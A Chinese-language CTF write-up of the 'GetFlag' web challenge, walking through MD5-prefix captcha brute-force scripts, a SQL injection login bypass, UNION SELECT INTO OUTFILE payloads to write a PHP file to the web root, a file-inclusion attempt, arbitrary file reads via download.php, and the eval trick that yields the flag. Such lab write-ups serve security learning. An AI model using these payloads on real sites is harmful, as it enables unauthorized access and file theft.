---
title: GetFlag
date: 2018-03-16 00:00:02
categories:
- CTF/Web
tags: 百度杯十月 SQL注入 文件包含 md5爆破
--- 

## 测试登录

验证码：`substr(md5(captcha), 0, 6)=b0b27d`


```python

# 带字母爆破

import hashlib
import itertools as its

words = "1234568790abcdefghijklmnopqrstuvwxyz"
r = its.product(words, repeat=5)

for i in r:
    a = "".join(i)
    md5 = hashlib.md5(a.encode('utf-8')).hexdigest()
    if(md5[0:6] == 'b0b27d'):
        print a
        break

```



```python

# 纯数字爆破

import hashlib
for i in range(1000000):
	fd = hashlib.md5()
	fd.update(str(i))
	x = fd.hexdigest()
	if(x[0:5] == code):
		print i
		break
```


测试万能密码登录成功：`admin'or'1'='1`，显然登录有一个注入点

登陆后跳转地址`/Challenges/action.php?action=file`  

页面中包含地址`./file/download.php?f=hello.txt`

## 利用点

1. /Challenges/action.php的action参数，文件包含？
2. /Challenges/file/download.php的f参数，任意文件读取？
3. 登录点存在注入

发现download.php可以使用绝对路径(/var/www/html)读取网站源码，相对路径（../）被过滤，以及位于`Challenges/file/a.php`文件的提示：`Do what you want to do, web dog, flag is in the web root dir`

## 歧途

尝试访问发现根目录`/var/www/html`下并没有flag.php，认为flag文件不是这个名字，于是想到列出网站根目录文件。于是需要getshell。

### sql写马

测试1.txt，发现并没有有权限，并且测试登录这里可以进行报错注入，这道题我甚至注出了admin的密码，不过并没什么用
```
username=admin&password=admin'+Union+Select+1,2,3+inTo+ouTfile+'/var/www/html/1.txt'+%23&captcha_md5=161645&submit=Submit
```

若有权限，可以使用如下方式继续测试
```
username=admin&password=admin'+Union+Select+1,'<?php phpinfo();?>',3+inTo+ouTfile+'/var/www/html/1.php'+%23&captcha_md5=161645&submit=Submit
```

### 文件包含

尝试在`/Challenges/action.php`利用`php://input`，然后post发送php语句执行。发现并没用，查看源码发现这里已经失去了php伪协议利用的条件。

```php
<?php

//action.php

	if (isset($_GET['action'])) {
		$model = "include/" . $_GET['action'] . ".php";
		if (!is_file($model)){
			echo "Model not exist!";
			exit; 
		} else {
			include_once($model);
		}
	}
?>
```

可见在include_once()的参数已经拼接上了`include/`字符串，所以这里无法利用除了相对路径以外的获取文件的方式。

## 根目录！！！

flag在网站根目录下，发现居然是`/var/www/html/Challenges/`目录下，你说这是网站根目录（无奈），利用download.php读到flag.php源码，访问`http:/784e6b7e50e74866a4cf3df85059c7eb49209b9d6b584d85.game.ichunqiu.com/Challenges/file/download.php?f=/var/www/html/Challenges/flag.php`

```php

<?php
$f = $_POST['flag'];
$f = str_replace(array('`', '$', '*', '#', ':', '\\', '"', "'", '(', ')', '.', '>'), '', $f);
if((strlen($f) > 13) || (false !== stripos($f, 'return')))
{
		die('wowwwwwwwwwwwwwwwwwwwwwwwww');
}
try
{
		 eval("\$spaceone = $f");
}
catch (Exception $e)
{
		return false;
}
if ($spaceone === 'flag'){
	echo file_get_contents("helloctf.php");
}

?>
```

直接download.php读取helloctf.php失败，分析源码逻辑，执行`"\$spaceone = $f"`最后判断`$spaceone===flag`，`eval`函数参数是一句完整的php语句，所以需要加上逗号，最后向`Challenges/flag.php`提交post参数`flag=flag;`







